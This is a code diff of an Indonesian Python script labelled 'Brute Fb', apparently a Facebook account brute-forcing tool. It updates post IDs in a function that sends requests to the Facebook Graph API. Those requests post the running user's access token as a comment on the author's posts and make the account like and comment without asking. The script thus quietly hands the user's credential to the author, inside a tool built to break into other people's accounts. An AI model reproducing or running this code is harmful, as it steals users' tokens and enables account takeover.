@@ -6,7 +6,6 @@ Facebook  = 'Facebook.com/fikritampan305'
 Instagram = 'Instagram.com/fi_sinaga'
 Whatsapp  = '081269496231'
 YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
-Version   = '2.0'
 Syafii  = 100080716718035
 Postingan = 115753054458585
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
@@ -59,64 +58,15 @@ def banner():
     war_dom = random.choice([P,K,M,J,U,H])
     print("""
 ___________________________________________________
- ____  __  __ ____  _____  |.Version 2.0
-|  _ \|  \/  | __ )|  ___| |[•]Mhd.Syafii
-| | | | |\/| |  _ \| |_    |[•]27-22-1998
-| |_| | |  | | |_) |  _|   |[•]Brute Fb
-|____/|_|  |_|____/|_|     |[•]11-04-2022
+ ____  __  __ ____  _____  |[•] Version 11
+|  _ \|  \/  | __ )|  ___| |[•] Mhd.Syafii
+| | | | |\/| |  _ \| |_    |[•] 27-22-1998
+| |_| | |  | | |_) |  _|   |[•] Brute Fb
+|____/|_|  |_|____/|_|     |[•] 11-04-2022
 ____________________________________________________
  |""")
 
 
-###----------[ TIME ]---------- ###
-skrng = datetime.now()
-tahun = skrng.year
-bulan = skrng.month
-hari  = skrng.day
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
-try:
-    if bulan < 0 or bulan > 12:
-        exit()
-    bulan_skrng = bulan - 1
-except ValueError:
-    exit()
-_bulan_ = bulan_cek[bulan_skrng]
-tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))
-
-##### BUAT STR /LEN
-id = []
-ok = []
-cp = []
-loop=0
-
-###----------[ CLEAR TERMINAL ]---------- ###
-def resik():
-    if "linux" in sys.platform.lower():
-        try:os.system("clear")
-        except:pass
-    elif "win" in sys.platform.lower():
-        try:os.system("cls")
-        except:pass
-    else:
-        try:os.system("clear")
-        except:pass
-
-### BUAT ANIMASI JALAN
-def jalan(z):
-	for e in z + "\n":
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.03)
-		
-###----------[ GLOBAL URL & HEADERS ]---------- ###
-url_businness = "https://business.facebook.com"
-ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
-kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
-web_fb = "https://www.facebook.com/"
-m_fb = "https://m.facebook.com/"
-mbasic = "https://mbasic.facebook.com/"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 
 ###----------[ CREATE FOLDER ]---------- ###
 def mkdir_data_login():
@@ -271,17 +221,18 @@ def ___fii___Sayang___Kamu___Widiya___l():
     kom = komenredem
     komentar = komtwol
     pipp = kartu2d
-    post = '2035221186641974'
+    post = '3144112082575661'
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/2035221186641974/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1696407830523313/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/2035221186641974/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/2035221186641974/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1696407830523313/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1639683522862411/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3330390423859469/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3144112082575661/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
+    jalan(f'{P}[•] Login Berhasil')
     menu()
 	
 ###### BUAT MENU
